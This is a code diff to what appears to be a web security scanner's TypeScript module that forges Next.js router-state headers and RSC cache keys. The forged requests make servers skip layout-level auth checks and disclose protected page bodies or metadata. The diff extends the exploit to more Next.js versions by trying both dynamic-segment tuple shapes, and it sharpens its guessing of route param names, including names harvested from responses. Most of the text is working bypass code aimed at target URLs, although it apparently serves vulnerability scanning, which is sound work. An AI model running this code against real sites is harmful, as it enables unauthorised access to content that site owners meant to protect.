@@ -17,9 +17,28 @@ export type LeafMode = "page" | "metadata-only";
  */
 export type AncestorSegment = string | { paramName: string; value: string };
 
+/**
+ * Next.js's `flightRouterStateSchema` validates a dynamic segment as a `superstruct.tuple()`,
+ * which requires an EXACT element count — too few OR too many elements both fail
+ * `assert()` before `matchSegment` is ever reached, rejecting the entire request. That
+ * exact count changed across Next.js releases: every version up to at least 16.2.6 requires
+ * a 3-element tuple (`[paramName, value, dynamicParamType]`); 16.3.0 added a mandatory 4th
+ * `staticSiblings` element (`[paramName, cacheKey, dynamicParamType, staticSiblings]`,
+ * `null` meaning "siblings unknown"). A black-box crawl can't know which schema shape the
+ * target's Next.js build expects, so both are tried (see `DYNAMIC_TUPLE_LENGTHS`).
+ */
+type DynamicTupleLength = 3 | 4;
+
 /** Converts one ancestor segment to its FlightRouterState wire representation. */
-const toSegmentRepr = (segment: AncestorSegment): string | [string, string, "d"] =>
-    typeof segment === "string" ? segment : [segment.paramName, segment.value, "d"];
+const toSegmentRepr = (
+    segment: AncestorSegment,
+    tupleLength: DynamicTupleLength
+): string | [string, string, "d"] | [string, string, "d", null] =>
+    typeof segment === "string"
+        ? segment
+        : tupleLength === 4
+          ? [segment.paramName, segment.value, "d", null]
+          : [segment.paramName, segment.value, "d"];
 
 /** The literal URL path value of an ancestor segment, regardless of representation. */
 export const ancestorSegmentValue = (segment: AncestorSegment): string =>
@@ -30,12 +49,17 @@ export const ancestorSegmentValue = (segment: AncestorSegment): string =>
  * claiming every segment in `ancestorSegments` is already client-rendered, with the
  * leaf segment either an ordinary `__PAGE__` node or (leafMode="metadata-only") a node
  * flagged so Next.js only re-executes `generateMetadata()` for it. Mirrors the
- * `flightRouterState[3]` check in `walk-tree-with-flight-router-state.tsx`.
+ * `flightRouterState[3]` check in `walk-tree-with-flight-router-state.tsx`. `tupleLength`
+ * only affects segments that are dynamic-ancestor claims (see `toSegmentRepr`).
  */
-export const buildStateTreeHeader = (ancestorSegments: AncestorSegment[], leafMode: LeafMode = "page"): string => {
+export const buildStateTreeHeader = (
+    ancestorSegments: AncestorSegment[],
+    leafMode: LeafMode = "page",
+    tupleLength: DynamicTupleLength = 4
+): string => {
     let node: unknown = leafMode === "metadata-only" ? ["__PAGE__", {}, null, "metadata-only"] : ["__PAGE__", {}];
     for (let i = ancestorSegments.length - 1; i >= 0; i--) {
-        node = [toSegmentRepr(ancestorSegments[i]), { children: node }];
+        node = [toSegmentRepr(ancestorSegments[i], tupleLength), { children: node }];
     }
     const tree = ["", { children: node }];
     return encodeURIComponent(JSON.stringify(tree));
@@ -124,30 +148,39 @@ const COMMON_DYNAMIC_PARAM_NAMES = [
 ] as const;
 
 /**
- * Ancestor-segment claims worth trying per candidate path: first segment only, every
- * segment but the leaf (both as plain static segments), and — for the latter, since a
- * static-segment guess can never match a real dynamic route — the same set with its last
- * segment additionally tried as each of `paramNameCandidates`. Defaults to
- * `COMMON_DYNAMIC_PARAM_NAMES`; `next_routerStateForge` also calls this with RSC-body-
- * harvested names as a fallback when the default list's guesses all fail.
+ * Ancestor-segment claims worth trying per candidate path, ordered from MOST to LEAST specific:
+ * every segment but the leaf, with its last segment tried as each of `paramNameCandidates`
+ * (the only shape that can actually match a real dynamic-route ancestor); then the same
+ * ancestor chain as plain static segments; then first-segment-only (the coarsest possible
+ * claim). Defaults to `COMMON_DYNAMIC_PARAM_NAMES`; `next_routerStateForge` also calls this
+ * with RSC-body-harvested names as a fallback when the default list's guesses all fail.
+ *
+ * Order matters: `tryAttempts` (in `next_routerStateForge`) returns on the first success it
+ * sees, so a weaker/coarser claim earlier in this list would prevent a stronger, more specific
+ * match later in the same leaf-mode pass from ever being tried — see internal-docs#172, where a
+ * bare single-segment claim (previously tried first) satisfied `metadata-only` leaf mode's
+ * success check without leaking real page content, masking a dynamic-ancestor match that would
+ * have.
  */
 export const buildAncestorAttempts = (
     pathSegments: string[],
     paramNameCandidates: readonly string[] = COMMON_DYNAMIC_PARAM_NAMES
 ): AncestorSegment[][] => {
     if (pathSegments.length === 0) return [];
-    const attempts: AncestorSegment[][] = [[pathSegments[0]]];
+    const firstSegmentOnly: AncestorSegment[] = [pathSegments[0]];
     const allButLeaf = pathSegments.slice(0, -1);
-    if (allButLeaf.length > 0 && allButLeaf.join("/") !== pathSegments[0]) {
-        attempts.push(allButLeaf);
-
-        const withoutLastAncestor = allButLeaf.slice(0, -1);
-        const lastAncestorValue = allButLeaf[allButLeaf.length - 1];
-        for (const paramName of paramNameCandidates) {
-            attempts.push([...withoutLastAncestor, { paramName, value: lastAncestorValue }]);
-        }
+    if (allButLeaf.length === 0 || allButLeaf.join("/") === pathSegments[0]) {
+        return [firstSegmentOnly];
     }
-    return attempts;
+
+    const withoutLastAncestor = allButLeaf.slice(0, -1);
+    const lastAncestorValue = allButLeaf[allButLeaf.length - 1];
+    const dynamicGuessAttempts: AncestorSegment[][] = paramNameCandidates.map((paramName) => [
+        ...withoutLastAncestor,
+        { paramName, value: lastAncestorValue },
+    ]);
+
+    return [...dynamicGuessAttempts, allButLeaf, firstSegmentOnly];
 };
 
 /** True when a Flight/RSC payload records a server-side redirect (the auth check actually ran). */
@@ -247,15 +280,19 @@ interface ForgeAttemptResult {
 /** Renders an ancestor-segment list back to its literal URL path, for the `Next-Url` header. */
 const ancestorsToPath = (ancestors: AncestorSegment[]): string => ancestors.map(ancestorSegmentValue).join("/");
 
+/** True when at least one ancestor segment is a dynamic-route claim (see `AncestorSegment`). */
+const hasDynamicSegment = (ancestors: AncestorSegment[]): boolean => ancestors.some((s) => typeof s !== "string");
+
 /** Sends one forged-ancestor RSC request and reports whether it looks like a successful bypass. */
 const attemptForge = async (
     candidateUrl: string,
     ancestors: AncestorSegment[],
     leafMode: LeafMode,
     keyMode: RscKeyMode,
-    timeout: number
+    timeout: number,
+    tupleLength: DynamicTupleLength
 ): Promise<ForgeAttemptResult> => {
-    const stateTree = buildStateTreeHeader(ancestors, leafMode);
+    const stateTree = buildStateTreeHeader(ancestors, leafMode, tupleLength);
     const nextUrl = "/" + ancestorsToPath(ancestors);
     const rscKey =
         keyMode === "legacy" ? computeLegacyRscKey(stateTree, nextUrl) : computeStrongRscKey(stateTree, nextUrl);
@@ -287,13 +324,41 @@ const attemptForgeWithKeyFallback = async (
     candidateUrl: string,
     ancestors: AncestorSegment[],
     leafMode: LeafMode,
-    timeout: number
+    timeout: number,
+    tupleLength: DynamicTupleLength
 ): Promise<ForgeAttemptResult & { keyMode: RscKeyMode }> => {
-    const legacy = await attemptForge(candidateUrl, ancestors, leafMode, "legacy", timeout);
+    const legacy = await attemptForge(candidateUrl, ancestors, leafMode, "legacy", timeout, tupleLength);
     if (legacy.success) return { ...legacy, keyMode: "legacy" };
 
-    const strong = await attemptForge(candidateUrl, ancestors, leafMode, "strong", timeout);
+    const strong = await attemptForge(candidateUrl, ancestors, leafMode, "strong", timeout, tupleLength);
     return { ...strong, keyMode: "strong" };
+};
+
+/** Both dynamic-segment tuple lengths real Next.js servers can require — see `DynamicTupleLength`. */
+const DYNAMIC_TUPLE_LENGTHS: readonly DynamicTupleLength[] = [4, 3];
+
+/**
+ * Wraps `attemptForgeWithKeyFallback` with a schema-shape fallback: an ancestor list with no
+ * dynamic segment is tried once (tuple length is irrelevant — no dynamic segment ever reaches
+ * `toSegmentRepr`'s tuple branch), but a list containing a dynamic-ancestor claim is retried
+ * under each of `DYNAMIC_TUPLE_LENGTHS` until one is accepted, since a black-box crawl can't
+ * know which schema shape the target's Next.js build expects (see `DynamicTupleLength`).
+ */
+const attemptForgeWithSchemaFallback = async (
+    candidateUrl: string,
+    ancestors: AncestorSegment[],
+    leafMode: LeafMode,
+    timeout: number
+): Promise<ForgeAttemptResult & { keyMode: RscKeyMode }> => {
+    if (!hasDynamicSegment(ancestors)) {
+        return attemptForgeWithKeyFallback(candidateUrl, ancestors, leafMode, timeout, 4);
+    }
+    let last: ForgeAttemptResult & { keyMode: RscKeyMode } = { success: false, body: "", keyMode: "legacy" };
+    for (const tupleLength of DYNAMIC_TUPLE_LENGTHS) {
+        last = await attemptForgeWithKeyFallback(candidateUrl, ancestors, leafMode, timeout, tupleLength);
+        if (last.success) return last;
+    }
+    return last;
 };
 
 const DEFAULT_RSC_PARAM_BRUTEFORCE_LIMIT = 20;
@@ -308,7 +373,16 @@ const DEFAULT_RSC_PARAM_BRUTEFORCE_LIMIT = 20;
  * Two leaf modes are tried per candidate: an ordinary `page` claim (full body disclosure)
  * first, and — only if every `page` attempt fails — a `metadata-only` claim, which can
  * still leak dynamic `generateMetadata()` output even where a full-body claim doesn't
- * cleanly apply (e.g. a tenant-scoped layout).
+ * cleanly apply (e.g. a tenant-scoped layout). Within each leaf mode, `tryAttempts` returns
+ * on the first success it finds among `buildAncestorAttempts`' ordered list, so that list is
+ * ordered most-to-least specific (dynamic-ancestor guesses, then the static full-chain claim,
+ * then the coarse first-segment-only claim) — a weak/coarse match must never be allowed to
+ * short-circuit past a stronger, more specific one in the same pass (internal-docs#172).
+ *
+ * Every dynamic-ancestor guess is tried against both `DYNAMIC_TUPLE_LENGTHS` schema shapes
+ * (see `DynamicTupleLength`), since a black-box crawl can't know which Next.js release the
+ * target runs and the two shapes are mutually exclusive (Next.js's schema validation rejects
+ * both a too-short AND a too-long tuple).
  *
  * If every `COMMON_DYNAMIC_PARAM_NAMES` guess fails for both leaf modes, a bounded fallback
  * kicks in (internal#158): every response body already returned by those failed attempts
@@ -316,7 +390,14 @@ const DEFAULT_RSC_PARAM_BRUTEFORCE_LIMIT = 20;
  * `extractParamNameCandidatesFromFlightBody` for the app's real param name. If that turns up
  * any name not already in the fixed list, one bonus round of dynamic-guess attempts is tried
  * with those harvested names (capped at `rscParamBruteforceLimit`; `0` disables this
- * fallback entirely) — for each leaf mode, only if that leaf mode's fixed-list pass failed.
+ * fallback entirely) — for each leaf mode, whenever that leaf mode's fixed-list pass didn't
+ * already produce a dynamic-ancestor match (see `tryAttempts`' `matchedDynamic` flag). A
+ * *weak* fixed-list success (a static/coarse ancestor claim, not a dynamic one) still lets
+ * the harvest-bonus round run — otherwise a real param name outside the fixed wordlist could
+ * never be tried at all, because the coarse claim's own success would permanently mask it
+ * (internal-docs#172, confirmed live: the coarse first-segment claim satisfies
+ * `metadata-only`'s success check while the real dynamic-ancestor claim, only reachable via
+ * harvesting, reveals the actually-scoped content).
  */
 const next_routerStateForge = async (
     candidateUrls: string[],
@@ -363,11 +444,19 @@ const next_routerStateForge = async (
         const ancestorAttempts = buildAncestorAttempts(segments);
 
         /** Tries every attempt in `attempts` under `leafMode`, harvesting param-name
-         * candidates from each body along the way; returns true and records the hit on the
-         * first success. */
-        const tryAttempts = async (attempts: AncestorSegment[][], leafMode: LeafMode): Promise<boolean> => {
+         * candidates from each body along the way; records the hit and returns on the first
+         * success. `matchedDynamic` reports whether that success came from a dynamic-ancestor
+         * claim (the strongest possible match) as opposed to a static/coarse one — callers use
+         * it to decide whether a weak success should still be followed by the harvested-name
+         * bonus round (see internal-docs#172: a coarse match succeeding must not, by itself,
+         * prevent a stronger dynamic-ancestor match — recovered only via harvesting when the
+         * real param name isn't in the fixed wordlist — from being tried in the same pass). */
+        const tryAttempts = async (
+            attempts: AncestorSegment[][],
+            leafMode: LeafMode
+        ): Promise<{ success: boolean; matchedDynamic: boolean }> => {
             for (const ancestors of attempts) {
-                const result = await attemptForgeWithKeyFallback(candidateUrl, ancestors, leafMode, timeout);
+                const result = await attemptForgeWithSchemaFallback(candidateUrl, ancestors, leafMode, timeout);
                 if (lastAncestorValue && result.body) {
                     for (const name of extractParamNameCandidatesFromFlightBody(result.body, lastAncestorValue)) {
                         harvestedNames.add(name);
@@ -386,28 +475,38 @@ const next_routerStateForge = async (
                     (leafMode === "page" ? bypassedUrls : metadataOnlyBypassedUrls).push(candidateUrl);
                     if (result.keyMode === "legacy") legacyKeyAcceptedUrls.push(candidateUrl);
                     recordChunks(result.body);
-                    return true;
+                    return { success: true, matchedDynamic: hasDynamicSegment(ancestors) };
                 }
             }
-            return false;
+            return { success: false, matchedDynamic: false };
         };
 
         /** Bonus round of dynamic-guess-only attempts built from names harvested so far but
          * not already covered by the fixed wordlist; `[]` (no-op) if nothing new was found
-         * or the fallback is disabled. */
+         * or the fallback is disabled. `buildAncestorAttempts` orders dynamic guesses first,
+         * followed by the two static (allButLeaf, first-segment-only) attempts already tried
+         * in the fixed-list pass — drop those two trailing entries here. */
         const harvestBonusAttempts = (): AncestorSegment[][] => {
             if (rscParamBruteforceLimit <= 0) return [];
             const newNames = [...harvestedNames].filter((n) => !COMMON_DYNAMIC_PARAM_NAMES.includes(n as never));
             if (newNames.length === 0) return [];
-            return buildAncestorAttempts(segments, newNames.slice(0, rscParamBruteforceLimit)).slice(2);
+            return buildAncestorAttempts(segments, newNames.slice(0, rscParamBruteforceLimit)).slice(0, -2);
         };
 
-        let bypassed = await tryAttempts(ancestorAttempts, "page");
-        if (!bypassed) bypassed = await tryAttempts(harvestBonusAttempts(), "page");
-        if (bypassed) return;
+        // A weak/coarse success (no dynamic-ancestor segment in the winning claim) does not
+        // skip the harvested-name bonus round — only a success that already matched a dynamic
+        // ancestor is the strongest result this pass can produce (internal-docs#172).
+        let pageResult = await tryAttempts(ancestorAttempts, "page");
+        if (!pageResult.success || !pageResult.matchedDynamic) {
+            const bonusResult = await tryAttempts(harvestBonusAttempts(), "page");
+            if (bonusResult.success) pageResult = bonusResult;
+        }
+        if (pageResult.success) return;
 
-        const metadataBypassed = await tryAttempts(ancestorAttempts, "metadata-only");
-        if (!metadataBypassed) await tryAttempts(harvestBonusAttempts(), "metadata-only");
+        const metadataResult = await tryAttempts(ancestorAttempts, "metadata-only");
+        if (!metadataResult.success || !metadataResult.matchedDynamic) {
+            await tryAttempts(harvestBonusAttempts(), "metadata-only");
+        }
     });
 
     return {
